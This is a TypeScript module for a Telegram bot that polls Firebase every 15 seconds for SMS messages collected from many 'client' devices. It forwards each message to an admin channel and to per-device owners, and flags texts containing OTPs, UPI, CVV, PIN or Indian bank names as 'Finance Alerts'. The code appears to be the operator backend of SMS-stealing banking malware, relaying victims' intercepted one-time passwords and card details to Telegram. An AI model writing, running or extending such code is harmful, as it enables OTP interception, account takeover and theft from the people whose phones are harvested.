import { Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import {
  fbGet,
  getSmsChannel,
  getSmsWatermarks,
  setSmsWatermark,
} from "./firebase";

const POLL_INTERVAL = 15_000;

const FINANCE_KEYWORDS = [
  "otp", "debit", "credit", "upi", "payment", "transaction", "transferred",
  "paid", "received", "balance", "account", "bank", "withdraw", "deposit",
  "inr", "₹", "rs.", "rs ", "neft", "imps", "rtgs", "paytm", "phonepe",
  "gpay", "googlepay", "bhim", "razorpay", "amount", "credited", "debited",
  "sbi", "hdfc", "icici", "axis", "kotak", "pnb", "bob", "canara",
  "net banking", "atm", "card", "cvv", "pin", "expiry", "insufficient",
];

function isFinanceSms(text: string): boolean {
  const lower = text.toLowerCase();
  return FINANCE_KEYWORDS.some((kw) => lower.includes(kw));
}

function escapeMarkdown(text: string): string {
  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
}

async function sendSafe(
  bot: Telegraf,
  channelId: string,
  msg: string
): Promise<boolean> {
  try {
    await bot.telegram.sendMessage(channelId, msg, { parse_mode: "Markdown" });
    return true;
  } catch (err: any) {
    logger.error({ err, channelId }, "Failed to forward SMS to channel");
    return false;
  }
}

/** Small delay to avoid Telegram rate limits */
const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));

export function startSmsWatcher(bot: Telegraf, adminId: number): void {
  let watermarks: Record<string, number> = {};
  let ready = false;

  async function init() {
    try {
      const saved = await getSmsWatermarks();
      watermarks = saved;

      const clients = await fbGet("clients");
      if (clients) {
        for (const deviceId of Object.keys(clients)) {
          if (watermarks[deviceId] === undefined) {
            watermarks[deviceId] = Date.now();
          }
        }
      }
      ready = true;
      logger.info("SMS watcher initialized");
    } catch (err) {
      logger.error({ err }, "SMS watcher init error");
      ready = true;
    }
  }

  async function poll() {
    if (!ready) return;

    try {
      const [globalChannelId, clients, messages, userChannels] = await Promise.all([
        getSmsChannel(),
        fbGet("clients"),
        fbGet("messages"),
        fbGet("config/userChannels"),
      ]);

      if (!clients) return;

      for (const [deviceId, deviceData] of Object.entries(
        clients as Record<string, any>
      )) {
        const smsData: Record<string, any> | undefined =
          (messages as any)?.[deviceId] || (deviceData as any)?.sms;
        if (!smsData) continue;

        const sampleEntry = Object.values(smsData)[0] as any;
        const isNewFormat = sampleEntry && sampleEntry.id != null && !sampleEntry.date;

        const getSortKey = (sms: any): number =>
          isNewFormat ? (sms.id ?? 0) : parseInt(sms.date || "0", 10);

        const currentMaxKey = Math.max(
          ...Object.values(smsData).map((s: any) => getSortKey(s)),
          0
        );

        if (
          watermarks[deviceId] === undefined ||
          (isNewFormat && watermarks[deviceId] > 1_000_000)
        ) {
          watermarks[deviceId] = currentMaxKey;
          await setSmsWatermark(deviceId, currentMaxKey);
          continue;
        }

        const lastWatermark = watermarks[deviceId];
        const ownerTelegramId: string | null =
          (deviceData as any)?.ownerTelegramId || null;

        const newEntries = Object.values(smsData)
          .filter((sms: any) => getSortKey(sms) > lastWatermark)
          .sort((a: any, b: any) => getSortKey(a) - getSortKey(b));

        if (newEntries.length === 0) continue;

        let latestKey = lastWatermark;

        for (const sms of newEntries as any[]) {
          const sortKey = getSortKey(sms);
          const phone   = (deviceData as any).mobNo || (deviceData as any).phone || deviceId;
          const from    = sms.sender || sms.from || "Unknown";
          const body    = sms.message || sms.body || "";
          const dateStr = sms.dateTime
            ? sms.dateTime
            : sms.date
              ? new Date(parseInt(sms.date)).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" }) + " IST"
              : "Unknown";
          const isFinance = isFinanceSms(body);

          const msg =
            `📨 *New SMS*\n\n` +
            `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
            `🕐 ${dateStr}\n\n` +
            `${escapeMarkdown(body)}`;

          const financeMsg =
            `💰 *Finance Alert*\n\n` +
            `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
            `🕐 ${dateStr}\n\n` +
            `${escapeMarkdown(body)}`;

          // ── 1. Global admin channel ──────────────────────────────────
          if (globalChannelId) {
            await sendSafe(bot, globalChannelId, msg);
            await delay(300);
          }

          // ── 2. Owner notifications ───────────────────────────────────
          if (ownerTelegramId) {
            const ownerCfg = userChannels?.[ownerTelegramId] || {};

            // 2a. Owner's personal SMS channel (if configured)
            if (ownerCfg.sms) {
              await sendSafe(bot, ownerCfg.sms, msg);
              await delay(300);
            } else if (ownerTelegramId !== adminId.toString()) {
              // 2b. No channel set — send directly to owner's DM
              await sendSafe(bot, ownerTelegramId, msg);
              await delay(300);
            }

            // 2c. Finance channel (if configured and SMS is financial)
            if (isFinance && ownerCfg.finance) {
              await sendSafe(bot, ownerCfg.finance, financeMsg);
              await delay(300);
            } else if (
              isFinance &&
              !ownerCfg.finance &&
              ownerTelegramId !== adminId.toString()
            ) {
              // 2d. No finance channel — send finance alert to owner DM too
              await sendSafe(bot, ownerTelegramId, financeMsg);
              await delay(300);
            }

            // 2e. Keyword rules
            if (ownerCfg.rules) {
              const rules = Object.values(ownerCfg.rules) as Array<{
                keyword: string;
                channel: string;
              }>;
              for (const rule of rules) {
                if (body.toLowerCase().includes(rule.keyword.toLowerCase())) {
                  const kwMsg =
                    `🔔 *Keyword Alert: ${escapeMarkdown(rule.keyword)}*\n\n` +
                    `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
                    `🕐 ${dateStr}\n\n` +
                    `${escapeMarkdown(body)}`;
                  await sendSafe(bot, rule.channel, kwMsg);
                  await delay(300);
                }
              }
            }
          }

          if (sortKey > latestKey) latestKey = sortKey;
        }

        if (latestKey > lastWatermark) {
          watermarks[deviceId] = latestKey;
          await setSmsWatermark(deviceId, latestKey);
        }
      }
    } catch (err) {
      logger.error({ err }, "SMS watcher poll error");
    }
  }

  init().then(() => {
    setInterval(poll, POLL_INTERVAL);
    poll();
  });

  logger.info("SMS watcher started (polling every 15s)");
}
